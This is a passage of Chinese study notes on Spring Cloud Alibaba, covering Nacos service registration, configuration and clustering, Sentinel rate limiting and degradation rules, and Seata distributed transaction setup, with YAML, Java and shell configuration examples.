<li>服务降级，限流与熔断，支持Servlet，Feign，RestTemplate，Dubbo，RocketMQ，还可以监控</li>
<li>服务注册与发现，默认集成了Ribbon</li>
<li>分布式配置管理，支持自动刷新</li>
<li>消息驱动能力，基于Stream</li>
<li>对象存储</li>
<li>分布式任务调度</li>
</ul>
<p>使用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.0.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>模块包含</p>
<ul>
<li>Sentinel - 流量控制，熔断降级，负载均衡</li>
<li>Nacos - 服务发现，配置管理</li>
<li>RocketMQ - 分布式消息和流计算平台</li>
<li>Dubbo - Java RPC 框架</li>
<li>Seata - 微服务分布式事务解决方案</li>
<li>OSS - 对象存储</li>
<li>SchedulerX - 任务调度产品</li>
</ul>
<h3 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h3><p>包括服务管理，配置管理，服务发现，自带负载均衡。</p>
<p>相当于：Eureka + Config + Bus</p>
<p>下载安装</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./bin/startup.cmd</span><br></pre></td></tr></table></figure>

<p>访问<code>http://localhost:8848/nacos</code>，<code>nacos</code>，<code>nacos</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-alibaba-nacos-discovery</span><br></pre></td></tr></table></figure>

<p>服务提供者</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9001</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos.provider</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="comment"># 注册到该服务器上</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">endpoints:</span></span><br><span class="line">    <span class="attr">web:</span></span><br><span class="line">      <span class="attr">exposure:</span></span><br><span class="line">        <span class="attr">include:</span> <span class="string">&#x27;*&#x27;</span></span><br></pre></td></tr></table></figure>

<p>主启动类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br></pre></td></tr></table></figure>

<p>编写业务类（略）</p>
<p>消费者</p>
<p>配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos.consumer</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 可以不配</span></span><br><span class="line"><span class="attr">service-url:</span></span><br><span class="line">  <span class="comment"># 要访问的微服务</span></span><br><span class="line">  <span class="attr">nacos-user-service:</span> <span class="string">http://nacos.provider</span></span><br></pre></td></tr></table></figure>

<p>因为使用了Ribbon，要写一个配置类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RibbonConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@LoadBalanced</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">getRestTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写业务类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderNacosController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowried</span></span><br><span class="line">    <span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line">    <span class="meta">@Value($&#123;service.nacos-user-service&#125;)</span></span><br><span class="line">    <span class="keyword">private</span> String serverURL;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/get&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">get</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> restTemplate.getForObject(serverURL + <span class="string">&quot;/get&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然也可以在这里整合OpenFeign。</p>
<p>作为配置中心：可以直接在Web界面上配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-alibaba-nacos-config</span><br></pre></td></tr></table></figure>

<p>配置客户端<code>bootstrap.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos.config.client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span></span><br></pre></td></tr></table></figure>

<p>以及<code>application.yml</code></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">dev</span></span><br></pre></td></tr></table></figure>

<p>编写业务类，用于动态刷新</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RefreshScope</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigClientController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;config.info&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String info;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/config/info&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getConfigInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置服务器上的配置DataID格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;spring.application.name&#125;-$&#123;spring.profile.active&#125;.$&#123;spring.cloud.nacos.config.file-extension&#125;</span><br></pre></td></tr></table></figure>



<p>分类设计：采用命名空间 + 分组 + 配置ID设计。默认值为：</p>
<ul>
<li>Namespace - public</li>
<li>Group - DEFAULT_GROUP</li>
<li>Cluster - DEFAULT</li>
</ul>
<p>功能：</p>
<ul>
<li>Namespace - 划分运行环境：dev prod test</li>
<li>Group - 划分不同的微服务到一个分组</li>
<li>Cluster - 一个Cluster可以包含多个微服务，一个Cluster工作在一个机房内。</li>
<li>Instance - 微服务实例。</li>
</ul>
<p>采用不同组下同一个配置文件的方式，此时会根据组名加载不同组下的同一个文件<code>nacos.config.client-info.yml</code>：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos.config.client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span></span><br><span class="line">        <span class="attr">group:</span> <span class="string">TEST_GROUP</span></span><br></pre></td></tr></table></figure>

<p>配置相应的配置文件</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">info</span></span><br></pre></td></tr></table></figure>



<p>采用不同命名空间配置方式，创建命名空间，例如dev，test，public等：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nacos.config.client</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">        <span class="attr">file-extension:</span> <span class="string">yaml</span></span><br><span class="line">        <span class="attr">namespace:</span> <span class="string">...</span> <span class="comment"># 命名空间的ID号</span></span><br><span class="line">        <span class="attr">group:</span> <span class="string">DEFAULT_GROUP</span></span><br></pre></td></tr></table></figure>

<p>实践：</p>
<ul>
<li>Namespace - 例如可以隔离开发环境、测试环境和生产环境，因为它们的配置可能各不相同，或者是隔离不同的用户，不同的开发人员使用同一个nacos管理各自的配置，可通过namespace隔离。</li>
<li>Group - 可用于区分不同的项目或应用。是一个项目。</li>
<li>DataID - 一个配置集可能包含了数据源、线程池、日志级别等配置项。是一个工程的主配置文件。</li>
</ul>
<p>集群和持久化</p>
<ul>
<li>单机模式：采用嵌入式数据库derby，可以切换到MySQL。</li>
<li>集群模式：采用Nginx集群、Nacos集群（至少3个）、MySQL集群搭建，确保高可用。</li>
<li>多集群模式</li>
</ul>
<p>切换MySQL</p>
<p>找到脚本文件<code>/nacos/conf/nacos-mysql.sql</code>，放到MySQL数据库中执行。</p>
<p>找到配置文件<code>/nacos/conf/application.application</code>添加内容：</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring.datasource.platform</span>=<span class="string">mysql</span></span><br><span class="line"><span class="attr">db.num</span>=<span class="string">1</span></span><br><span class="line"><span class="attr">db.url.0</span>=<span class="string">jdbc:mysql://127.0.0.1:3306/nacos/config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;serverTimezone=UTC</span></span><br><span class="line"><span class="attr">db.user</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">db.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>

<p>配置集群</p>
<p>修改<code>/nacos/conf/cluster.conf</code>文件。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">192.168.100.101:3001</span><br><span class="line">192.168.100.101:3002</span><br><span class="line">192.168.100.101:3003</span><br><span class="line"><span class="comment"># 必须是 hostname -I 能够识别的地址</span></span><br></pre></td></tr></table></figure>

<p>找到并修改<code>startup.sh</code>文件。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一步</span></span><br><span class="line"><span class="comment"># 添加 p 参数</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">getopts</span> <span class="string">&quot;:m:f:s:p:&quot;</span> opt</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">case</span> <span class="variable">$opt</span> <span class="keyword">in</span></span><br><span class="line">	m)</span><br><span class="line">	...</span><br><span class="line">	f)</span><br><span class="line">	...</span><br><span class="line">	s)</span><br><span class="line">	...</span><br><span class="line">	<span class="comment"># 添加 p 参数</span></span><br><span class="line">	p)</span><br><span class="line">		PORT=<span class="variable">$OPTARG</span>;;</span><br><span class="line">	?)</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Unkonwn parameter&quot;</span></span><br><span class="line">	exit1;;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步</span></span><br><span class="line"><span class="built_in">nohup</span> <span class="variable">$JAVA</span> -Dserver.port=<span class="variable">$&#123;PORT&#125;</span> <span class="variable">$&#123;JAVA_OPT&#125;</span> nacos.nacos &gt;&gt; <span class="variable">$&#123;BASE_IDR&#125;</span>/logs/start.out 2&gt;&amp;1 &amp;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nacos is starting ....&quot;</span></span><br></pre></td></tr></table></figure>

<p>使用启动脚本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./startup.sh -p 3001</span><br><span class="line">./startup.sh -p 3002</span><br><span class="line">./startup.sh -p 3003</span><br></pre></td></tr></table></figure>

<p>再配置Nginx</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> cluster &#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3001</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3002</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">127.0.0.1:3003</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">3000</span>;</span><br><span class="line">    <span class="attribute">server_name</span> localhost;</span><br><span class="line">    </span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://cluster;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Sentinel"><a href="#Sentinel" class="headerlink" title="Sentinel"></a>Sentinel</h3><p>主要负责熔断与限流。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-alibaba-sentinel</span><br></pre></td></tr></table></figure>

<p>主要分为前台和后台两部分。</p>
<p>使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar sentinel-dashboard-1.x.x.jar</span><br></pre></td></tr></table></figure>

<p>打开<code>http://localhost:8080</code>，<code>sentinel</code>，<code>sentinel</code></p>
<p>微服务配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sentinel.service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8080</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span>  <span class="comment"># sentinel 检查心跳、健康状态的端口</span></span><br></pre></td></tr></table></figure>

<p>也可以结合OpenFeign（对客户端请求做负载均衡）使用。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>编辑业务类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowLimitController</span>&#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于是懒加载机制，因此需要手动请求一次接口才能看到服务。</p>
<p>在簇点链路中，可以控制接口流量。</p>
<p>流量控制规则</p>
<ul>
<li>流控模式<ul>
<li>直连：默认，API达到限流条件，直接限流</li>
<li>关联：当关联的资源A达到阈值，就限流自己B，例如支付接口挂了，就限流下订单的接口。</li>
<li>链路：链路A-Z上的流量达到阈值，就限流自己A</li>
</ul>
</li>
<li>流控效果<ul>
<li>快速失败：直接失败，抛出异常。<code>com.alibaba.csp.sentinel.slots.block.flow.controller.DefaultController</code>。</li>
<li>WarmUP：慢启动。根据 <code> 阈值 / codeFactor(default=3)</code>设置阈值，设置冷启动时间慢慢达到最大阈值。</li>
<li>排队等待：匀速排队（必须是QPS模式）。漏桶算法。</li>
</ul>
</li>
</ul>
<p>降级规则，默认快速失败，抛出DegradeException；没有半开状态</p>
<ul>
<li>RT：平均响应时间（毫秒）超出阈值且窗口内请求数超过5，触发降级；窗口期过后关闭降级</li>
<li>异常比例：QPS超过5且异常比例（秒）超过阈值，触发降级；窗口期过后关闭降级</li>
<li>异常数：异常数（分钟）超过阈值，触发降级；窗口期过后关闭降级</li>
</ul>
<p>热点Key限流：根据热点参数进行限流，例如根据用户ID限流。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testHotKey&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value=&quot;testHotKey&quot;, blockHandler=&quot;testHandler&quot;)</span>  <span class="comment">// 不处理运行时错误</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(value=&quot;id&quot;)</span> String id)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testHandler</span><span class="params">(String id, BlockException exception)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>配置</p>
<ul>
<li><p>资源名：testHotKey</p>
</li>
<li><p>参数索引：0 - 第零个</p>
</li>
<li><p>阈值：1</p>
</li>
<li><p>参数例外项：当参数是某个特殊值时，不限流</p>
</li>
</ul>
<p>系统规则：能够自适应限流。是从整体维度从入口进行控制。</p>
<ul>
<li>LOAD（Linux）</li>
<li>RT</li>
<li>线程数</li>
<li>入口QPS</li>
<li>CPU使用率</li>
</ul>
<p>SentinelResource</p>
<p>按资源名称限流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/testHotKey&quot;)</span></span><br><span class="line"><span class="meta">@SentinelResource(value=&quot;testHotKey&quot;, blockHandler=&quot;testHandler&quot;)</span> </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test</span><span class="params">(<span class="meta">@RequestParam(value=&quot;id&quot;)</span> String id)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">testHandler</span><span class="params">(String id, BlockException exception)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>但是要解决耦合和代码膨胀问题，使用统一的兜底类<code>handlers/CustomerBlockHandler</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerBlockHandler</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">handlerException</span><span class="params">(BlockException exception)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;404&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomerFallbackHandler</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">handlerException</span><span class="params">(Throwable exception)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;404&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="meta">@SentinelResource(</span></span><br><span class="line"><span class="meta">    value=&quot;testHotKey&quot;, </span></span><br><span class="line"><span class="meta">    blockHandlerClass=CustomerBlockHandler.class, </span></span><br><span class="line"><span class="meta">    blockHandler=&quot;handlerException&quot;,  // 触发限流处理函数</span></span><br><span class="line"><span class="meta">    fallbackClass=CustomerFallbackHandler.class,</span></span><br><span class="line"><span class="meta">    fallback=&quot;handlerException&quot;,   // 业务出错处理函数</span></span><br><span class="line"><span class="meta">    exceptionToIgnore=&#123;IllegalArgumentException.class&#125;)</span>  <span class="comment">// 忽略异常</span></span><br></pre></td></tr></table></figure>



<p>使用OpenFeign，将内核替换为Sentinel</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">sentinel:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>编写服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(</span></span><br><span class="line"><span class="meta">    value=&quot;service-name&quot;,</span></span><br><span class="line"><span class="meta">    fallback=xx.class</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyService</span>&#123;</span><br><span class="line">    <span class="comment">// 调用的接口</span></span><br><span class="line">    <span class="meta">@GetMapping(value=&quot;/serv/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">serv</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Long id)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">MyService</span>&#123;&#125;</span><br></pre></td></tr></table></figure>



<p>持久化</p>
<p>默认情况下配置是临时的，服务关闭，配置就消失。因此需要持久化。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sentinel-datasource-nacos</span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">sentinel.service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">    <span class="attr">sentinel:</span></span><br><span class="line">      <span class="attr">transport:</span></span><br><span class="line">        <span class="attr">dashboard:</span> <span class="string">localhost:8080</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8719</span>  <span class="comment"># sentinel 检查心跳、健康状态的端口</span></span><br><span class="line">        <span class="attr">datasource:</span></span><br><span class="line">          <span class="attr">ds1:</span></span><br><span class="line">            <span class="attr">nacos:</span></span><br><span class="line">              <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">              <span class="attr">dataId:</span> <span class="string">$&#123;spring.application.name&#125;</span></span><br><span class="line">              <span class="attr">groupId:</span> <span class="string">DEFAULT_GROUP</span></span><br><span class="line">              <span class="attr">data-type:</span> <span class="string">json</span></span><br><span class="line">              <span class="attr">rule-type:</span> <span class="string">flow</span></span><br></pre></td></tr></table></figure>



<h3 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h3><p>处理分布式事务问题：保障全局数据的一致性（多中心，多数据库）。</p>
<p>概念（XA协议）</p>
<ul>
<li>全局事务ID</li>
<li>TC - 事务协调者，维护全局和分支事务状态，负责提交和回滚</li>
<li>TM - 事务管理器，定义全局事务的范围</li>
<li>RM - 资源管理器，与TC交谈以注册分支事务和报告分支事务状态</li>
</ul>
<p>控制事务，在业务方法上添加如下注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 本地事务 Spring</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局事务 Seata</span></span><br><span class="line"><span class="meta">@GlobalTransactional</span></span><br></pre></td></tr></table></figure>

<p>下载配置</p>
<p>修改<code>file.conf</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">事务组名称</span><br><span class="line">service &#123;</span><br><span class="line">	...</span><br><span class="line">	vgroup_mapping.my_test_tx_group = &quot;xxx_tx_group&quot;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">存储模块方式</span><br><span class="line">store &#123;</span><br><span class="line">	...</span><br><span class="line">	mode = &quot;db&quot;</span><br><span class="line">	...</span><br><span class="line">	url = &quot;&quot;</span><br><span class="line">	user = &quot;&quot;</span><br><span class="line">	password = &quot;&quot;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后再创建数据库，使用<code>db_store.sql</code></p>
<p>修改<code>registry.conf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">registry &#123;</span><br><span class="line">	type = &quot;nacos&quot;</span><br><span class="line">	...</span><br><span class="line">	nacos&#123;</span><br><span class="line">		serverAddr = &quot;localhost:8848&quot;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动<code>seata-server.bat</code></p>
<p>一次事务案例</p>
<ol>
<li>创建订单</li>
<li>远程调用库存服务，扣减商品库存</li>
<li>远程调用账户服务，扣减余额</li>
<li>修改订单状态</li>
</ol>
<p>总共调用3次数据库，2个远程服务。</p>
<p>之后创建数据库3个，每个库下创建数据表，以及1个回滚日志表<code>undo_log</code>（<code>db_undo_log.sql</code>）。</p>
<p>创建模块</p>
<p>配置 POM</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring-cloud-starter-alibaba-nacos-discovery</span><br><span class="line">spring-cloud-starter-alibaba-nacos-seata   剔除 seata-all 引入 seata-all 其他版本</span><br><span class="line">spring-cloud-starter-openfeign</span><br></pre></td></tr></table></figure>

<p>配置 YML</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">2001</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">seata.order.service</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://...</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">...</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">...</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">xxx_tx_group</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span> </span><br><span class="line">    <span class="attr">io:</span> </span><br><span class="line">      <span class="attr">seata:</span> <span class="string">info</span></span><br><span class="line">    </span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure>

<p>将上面的<code>file.conf</code>，<code>registry.conf</code>放到<code>resources</code>下，与配置文件同级。（1.0版本后，该配置写到yml中即可）</p>
<p>编写实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CommonResult&lt;&gt;;</span><br><span class="line">Order;  <span class="comment">// 订单</span></span><br></pre></td></tr></table></figure>

<p>编写 DAO &#x2F; Mapper</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建订单</span></span><br><span class="line"><span class="comment">// 修改订单状态</span></span><br></pre></td></tr></table></figure>

<p>编写 Service 接口 实现类</p>
